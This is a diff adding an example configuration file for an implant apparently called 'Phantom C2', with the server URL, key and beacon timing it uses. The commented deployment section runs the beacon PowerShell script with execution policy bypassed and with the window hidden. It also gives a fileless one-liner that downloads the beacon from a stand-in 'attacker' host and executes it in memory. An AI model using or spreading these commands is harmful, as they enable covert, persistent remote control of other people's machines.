@@ -1,0 +1,31 @@
+# Phantom C2 Implant Configuration Example
+# Copy this file and modify for your deployment
+
+# C2 Server Configuration
+SERVER_URL="http://192.168.1.100:8080"
+SERVER_KEY="PASTE_YOUR_HEX_KEY_FROM_server_key.txt"
+
+# Beacon Timing (in seconds)
+MIN_INTERVAL=30
+MAX_INTERVAL=60
+
+# Retry Configuration
+MAX_RETRIES=5
+
+# Usage Instructions:
+# 1. Get the SERVER_KEY from the C2 server output or server_key.txt
+# 2. Replace SERVER_URL with your C2 server's IP address
+# 3. Modify beacon.ps1 to use these values, OR
+# 4. Pass as parameters when executing:
+#    powershell.exe -ExecutionPolicy Bypass -File beacon.ps1 -ServerUrl "http://IP:8080" -ServerKey "KEY"
+
+# Example Deployment Commands:
+
+# Standard execution:
+# powershell.exe -ExecutionPolicy Bypass -File beacon.ps1 -ServerUrl "http://192.168.1.100:8080" -ServerKey "a1b2c3..."
+
+# Hidden execution (no window):
+# powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File beacon.ps1 -ServerUrl "http://192.168.1.100:8080" -ServerKey "a1b2c3..."
+
+# From memory (no file on disk):
+# $code = (New-Object Net.WebClient).DownloadString('http://attacker/beacon.ps1'); Invoke-Expression $code
